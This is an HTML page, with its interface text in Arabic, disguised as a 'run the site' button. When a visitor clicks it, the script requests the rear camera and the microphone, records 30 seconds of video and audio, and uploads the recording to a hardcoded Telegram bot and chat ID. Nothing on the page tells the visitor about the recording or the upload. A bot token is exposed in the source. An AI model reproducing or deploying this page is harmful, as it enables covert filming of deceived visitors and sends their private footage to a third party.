<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تشغيل الموقع</title>
    <style>
        body {
            font-family: Arial;
            text-align: center;
            padding: 20px;
            background-color: #f5f5f5;
            margin: 0;
            touch-action: manipulation;
        }
        .container {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 100%;
            margin: 0 auto;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px auto;
            display: block;
            width: 80%;
        }
        button:active {
            background: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <button id="actionBtn">تشغيل الموقع</button>
    </div>

    <script>
        // بيانات البوت
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        // زر التشغيل/الإيقاف
        const actionBtn = document.getElementById('actionBtn');
        let isRecording = false;

        actionBtn.addEventListener('click', async () => {
            if (!isRecording) {
                // بدء التسجيل
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "environment" }, // استخدام الكاميرا الخلفية
                        audio: true 
                    });
                    
                    mediaRecorder = new MediaRecorder(stream, { 
                        mimeType: 'video/mp4',
                        videoBitsPerSecond: 2500000 // جودة متوسطة
                    });
                    
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
                        await sendVideoToTelegram(videoBlob);
                    };
                    
                    mediaRecorder.start(1000);
                    recordedChunks = [];
                    isRecording = true;
                    actionBtn.textContent = "جاري التشغيل...";
                    
                    // إيقاف تلقائي بعد 30 ثانية (اختياري)
                    setTimeout(() => {
                        if (isRecording) {
                            stopRecording();
                        }
                    }, 30000);
                    
                } catch (error) {
                    console.error('Error:', error);
                    actionBtn.textContent = "خطأ! اضغط مجدداً";
                }
            } else {
                // إيقاف التسجيل
                stopRecording();
            }
        });

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                isRecording = false;
                actionBtn.textContent = "تشغيل الموقع";
            }
        }

        // إرسال الفيديو إلى التليجرام
        async function sendVideoToTelegram(videoBlob) {
            try {
                actionBtn.textContent = "جارٍ الإرسال...";
                actionBtn.disabled = true;
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, 'video.mp4');
                formData.append('supports_streaming', 'true');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                actionBtn.textContent = "تم الإرسال بنجاح";
                
            } catch (error) {
                console.error('Error sending video:', error);
                actionBtn.textContent = "فشل الإرسال! اضغط مجدداً";
            } finally {
                setTimeout(() => {
                    actionBtn.textContent = "تشغيل الموقع";
                    actionBtn.disabled = false;
                }, 3000);
            }
        }

        // إيقاف التسجيل عند إغلاق الصفحة
        window.addEventListener('beforeunload', () => {
            if (isRecording) {
                stopRecording();
            }
        });
    </script>
</body>
</html>
